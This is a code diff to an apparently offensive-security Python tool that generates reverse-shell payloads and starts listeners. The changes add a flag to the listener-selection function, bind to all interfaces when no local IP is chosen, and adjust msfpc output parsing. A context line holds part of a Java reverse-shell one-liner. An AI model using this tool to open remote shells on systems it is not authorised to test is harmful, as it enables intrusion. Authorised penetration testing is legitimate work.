@@ -62,7 +62,7 @@ def signal_handler(sig: int, frame: object):
     sys.exit(1)
 
 
-def ask_listener() -> (str, int):
+def ask_listener() -> (str, int, bool):
     """
     Ask for the appropriate listener and return the IP and port the user selected.
 
@@ -72,6 +72,8 @@ def ask_listener() -> (str, int):
        The IP address the user selected
     int
         The port the user selected
+    bool
+        True if the user selected the IP address of one of the interfaces
     """
     interfaces = netifaces.interfaces()
     ip_addrs = []
@@ -84,6 +86,7 @@ def ask_listener() -> (str, int):
             ]
         )
     wan = None
+    interface_used = False
     try:
         wan = request.urlopen("https://api.ipify.org").readline().decode("utf-8")
     except:
@@ -100,6 +103,7 @@ def ask_listener() -> (str, int):
             cw = input("Which one do you want?: ")
             if int(cw) >= 1 and int(cw) <= idx:
                 ipp = ip_addrs[int(cw) - 1]
+                interface_used = True
                 break
             elif int(cw) == idx + 1 and wan:
                 ipp = wan
@@ -120,7 +124,7 @@ def ask_listener() -> (str, int):
             break
         except ValueError:
             print("Invalid input.")
-    return ipp, port
+    return ipp, port, interface_used
 
 
 def shell(listener: str):
@@ -132,7 +136,7 @@ def shell(listener: str):
     listener : str
         Optionally define the listener command to use instead of (xxx will be replaced by the IP address, yyy will be replaced by the port)
     """
-    ipp, port = ask_listener()
+    ipp, port, interface_used = ask_listener()
 
     # rlwrap creates bugs for Linux reverse shells, so using upgrade-tty or pwncat is preferred
     # If rlwrap was used to invoke this script, we can assume, that the user wants to run a Windows reverse shell
@@ -374,6 +378,9 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
     command = []
     if os.geteuid() != 0 and int(port) < 1024:
         command.append("sudo")
+    if not interface_used:
+        # User didn’t select a known interface IP, listen on all interfaces instead
+        ipp = '0.0.0.0'
     command.extend(listener.replace("xxx", ipp).replace("yyy", port).split(" "))
     Popen(command).communicate()
 
@@ -411,7 +418,7 @@ def payload():
         except ValueError:
             print("Invalid input.")
 
-    ipp, port = ask_listener()
+    ipp, port, _ = ask_listener()
 
     msfpc_format = None
     msfvenom_command = None
@@ -483,6 +490,7 @@ def payload():
         spawn_shell = (
             msfpc.stdout.decode("utf-8").split("Run: ")[1].splitlines()[0].split(" ")
         )
+        spawn_shell[-1] = spawn_shell[-1].replace("'", "")
     elif msfvenom_command and msfvenom_extension:
         payload = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}.{msfvenom_extension}'
         Popen(
